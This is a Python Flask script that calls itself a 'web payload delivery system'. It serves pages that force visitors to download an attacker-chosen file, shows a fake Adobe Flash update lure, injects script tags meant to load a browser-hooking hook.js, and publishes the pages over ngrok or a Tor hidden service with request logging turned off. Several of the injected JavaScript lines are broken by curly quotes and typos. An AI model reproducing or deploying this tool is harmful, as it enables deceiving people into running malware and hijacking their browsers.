import os
from werkzeug.utils import secure_filename
from flask import Flask,flash,request,redirect,send_file,render_template
import logging
import socket

#setup
def set_up(url, folder, local):
    print("[1] basic")
    print("[2] Update Flash [NOT WORKING]")
    i = int(input("[*] make choice: "))
############## adding the html ##############
    if i == 2:
        if local == 1:
            xx = '''<!DOCTYPE html>
<html>
    <head>
    </script>
      <meta http-equiv='refresh' content='0; URL=/uploadfile'>
    </head>
</html>
    '''
            x = '''<html>
    <title>Flash Update Needed</title>
    <style>
    p {
	color:red;
    }
    </style>
    <body>
    <img src="{{url_for('static', filename='Adobe.png')}}">
    <p>download the update</P>
    <script>
    var commandModuleStr = ‘<script src”‘ + window.location.proto + ‘//’ + windows.location.host + ‘” type=”text/javascript”>’;                                   document.write(commandModuleStr);
    </script>
      <meta http-equiv='refresh' content='0; URL=/return-files/'''+folder+''''>
    </head>
</html>
            '''
        if local == 0:
            xx = '''<!DOCTYPE html>
<html>
    <head>
    <script>
    var commandModuleStr = ‘<script src”‘ + window.location.proto + ‘//’ + windows.location.host + ‘” type=”text/javascript”>’;                                   document.write(commandModuleStr);
    </script>
      <meta http-equiv='refresh' content='0; URL=/return-files/'''+folder+''''>
    </head>
</html>
    '''
            x = '''<html>
    <title>Flash Update Needed</title>
    <style>
    p {
	color:red;
    }
    </style>
    <body>
    <img src="https://www.google.com/imgres?imgurl=https%3A%2F%2Fcdn.vox-cdn.com%2Fthumbor%2Ff1PIc5ofauYyw5XTwIFHznUDFhk%3D%2F0x0%3A600x445%2F1400x1050%2Ffilters%3Afocal(252x175%3A348x271)%3Aformat(jpeg)%2Fcdn.vox-cdn.com%2Fuploads%2Fchorus_image%2Fimage%2F55875423%2Fadobe-flash-logo.0.jpg&imgrefurl=https%3A%2F%2Fwww.theverge.com%2F2017%2F7%2F25%2F16026236%2Fadobe-flash-end-of-support-2020&tbnid=HtYaKTHw2iHuLM&vet=12ahUKEwj1sbi--tPvAhUI4hoKHR1rCAsQMygAegUIARDRAQ..i&docid=qlaFvGLNinHGVM&w=1400&h=1050&q=Adobe%20Flash&safe=strict&ved=2ahUKEwj1sbi--tPvAhUI4hoKHR1rCAsQMygAegUIARDRAQ" alt="Adobe Image">
    <p>download the update</P>
    <script>
    var commandModuleStr = ‘<script src”‘ + window.location.proto + ‘//’ + windows.location.host + ‘” type=”text/javascript”>’;                                   document.write(commandModuleStr);
    </script>
      <meta http-equiv='refresh' content='0; URL='''+url+'''/return-files/'''+folder+''''>
    </head>
</html>
            '''
    if i == 1:
        if local == 1:
            xx = '''<!DOCTYPE html>
<html>
    <head>
    </script>
      <meta http-equiv='refresh' content='0; URL=/uploadfile'>
    </head>
</html>
    '''
            x = '''<!DOCTYPE html>
<html>
    <head>
      <meta http-equiv='refresh' content='0; URL=/return-files/'''+folder+''''>
    </head>
</html>
            '''
        if local == 0:
            xx = '''<!DOCTYPE html>
<html>
    <head>
    <script>
    var commandModuleStr = '<script src="/hook.js" type="text/javascript"><\/script>';
                    document.write(commandModuleStr);
    </script>
      <meta http-equiv='refresh' content='0; URL='''+url+'''/uploadfile'>
    </head>
</html>
    '''
            x = '''<!DOCTYPE html>
<html>
    <head>
    <script>
    var commandModuleStr = ‘<script src”‘ + window.location.proto + ‘//’ + windows.location.host + ‘” type=”text/javascript”>’;                                   document.write(commandModuleStr);
    </script>
      <meta http-equiv='refresh' content='0; URL='''+url+'''/return-files/'''+folder+''''>
    </head>
</html>
            '''
############## adding the html ##############

    print(url)
    print("[*] writing...")
    print("[*] url = ",url)
    print("[*] folder = ",folder)
    file1 = open("templates/main","w+")
    file1.write(xx)
    file1.close()
    file = open("templates/test1","w+")
    file.write(x)
    file.close()
    print("[*] done!")

#  setup
def main():
    os.system("clear")
    run = True
    while run:
        try:
            print("              ___   __")
            print("__        __ |   | |  \ ")
            print("\ \  /\  / / | __| |   \ ")
            print(" \ \/  \/ /  | |   |    |")
            print("  \  /\  /   | |   |   /")
            print("   \/  \/    |_|   |__/  S")
            print("")
            print("[*] web payload delivery system")
            print("\n\n")
            x = 1

            UPLOAD_FOLDER = 'uploads/'

            #app = Flask(__name__)
            app = Flask(__name__, template_folder='templates')
            log = logging.getLogger('werkzeug')
            log.disabled = True
            app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER

            @app.route("/")
            def normal():
                #os.system("clear")
                return render_template('main')
            # Upload API
            @app.route('/uploadfile', methods=['GET', 'POST'])
            def upload_file():
                if request.method == 'POST':
                    # check if the post request has the file part
                    if 'file' not in request.files:
                        print('[*] no file')
                        return redirect(request.url)
                    file = request.files['file']
                    # if user does not select file, browser also
                    # submit a empty part without filename
                    if file.filename == '':
                        print('[*] no filename')
                        return redirect(request.url)
                    else:
                        filename = secure_filename(file.filename)
                        file.save(os.path.join(app.config['UPLOAD_FOLDER'], filename))
                        print("[*] saved file successfully")
                        #send file name as parameter to downlad
                        return redirect('/downloadfile/'+ filename) 
                print("[*] setting payload")
                #os.system("clear")
                return render_template('test1')

            # Download API
            @app.route("/downloadfile/<filename>", methods = ['GET'])
            def download_file(filename):
                return render_template('test1',value=filename)

            @app.route('/return-files/<filename>')
            def return_files_tut(filename):
                global x
                file_path = UPLOAD_FOLDER + filename
                print("[*] sent payload")
                print("[*] payload num ", x)
                try:
                    print("[*] running on ", s[1])
                except Exception:
                    print("[*] running on ngrok")
                x = x + 1
                return send_file(file_path, as_attachment=True, attachment_filename='')

           
            #find ip / make website
            #print("[*] BeEF biult in to every fake page")
            print("[0] over the internet (ngrok)")
            print("[1] local (for wan and tor)")
            chk = int(input("[*] enter choice: "))
            folder = input("[*] enter folder name make sure it's in uploads: ")
            print("\n[*] one last thing \ndefault_falsk = 5000 \ntor = 80")
            p = int(input("[*] enter port: "))
            if chk == 1:
                print("[1] tor")
                print("[2] local")
                i = int(input("[*] enter choice: "))
                if i == 2:
                    import netifaces
                    ip = netifaces.ifaddresses('wlan0')
                    s = ip[netifaces.AF_INET]
                    s = str(s)
                    s = s.replace("}","")
                    s = s.replace("{","")
                    s = s.replace("['","")
                    s = s.replace("'","")
                    s = s.replace(",","")
                    s = s.replace("']","")
                    s = s.replace("]","")
                    s = s.replace(":","")
                    s = s.split(" ")
                    st = str(s[1])
                    url = st
                if i == 1:
                    print("[*] setting up tor...")
                    url = "127.0.0.1"
                    st = url
                    os.system("sudo service tor start")
                    file = open("/var/lib/tor/hidden_service/hostname","r")
                    f = file.readlines()
                    print("[*] onion link = ", f)
                local = 1
                set_up(url, folder, local)
                #print("[*] runing on http://:"+p)
            if chk == 0:
                url = input("[*] enter the ngrok: ")
                local = 0
                set_up(url, folder, local)
                st = "localhost"
            print("host = ",st)
            print("port = ",p)
            app.run(host=st, debug=False, port=p)
        except KeyboardInterrupt:
            try:
                print("\n\n[CTRL+C] are you sure? ")
                input("[CTRL+C] press agin if you want to exit if not hit enter ")
            except KeyboardInterrupt:
                run = False
            os.system("clear")

